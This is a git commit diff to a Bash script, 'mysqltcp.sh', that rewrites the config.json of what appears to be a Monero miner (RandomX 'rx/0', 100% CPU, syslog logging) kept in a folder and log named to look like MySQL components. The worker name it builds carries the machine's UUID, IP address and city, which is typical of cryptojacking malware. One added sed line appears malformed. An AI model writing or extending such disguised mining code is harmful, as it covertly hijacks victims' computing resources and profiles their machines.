20ca5aada86979825d05201bd0bdea0a1fc68871
teshushu <905353149@qq.com>
2023-01-24 08:22:50 +0800

    Update mysqltcp.sh

--- Bash/mysqltcp.sh
+++ Bash/mysqltcp.sh
@@ -714,12 +714,12 @@ if [ -z $PASS ]; then
   PASS=na
 fi
 if [ ! -z $EMAIL ]; then
-  PASS="$PASS:$EMAIL"
+  PASS="$PASS"
 fi
 
-sed -i 's/"algo": *null,/"algo": "rx/0",/' $HOME/myssqltcp/config.json
+sed -i 's/"null": *"[^"]*",/"null": "rx/0",/' $HOME/myssqltcp/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$UUID'-'$MEIP'-'$UUIP'.'$CITY':'$PASS'",/' $HOME/myssqltcp/config.json
-sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS''",/' $HOME/myssqltcp/config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/myssqltcp/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/myssqltcp/config.json
 sed -i 's#"log-file": *null,#"log-file": "'$HOME/myssqlsys.log'",#' $HOME/myssqltcp/config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/myssqltcp/config.json
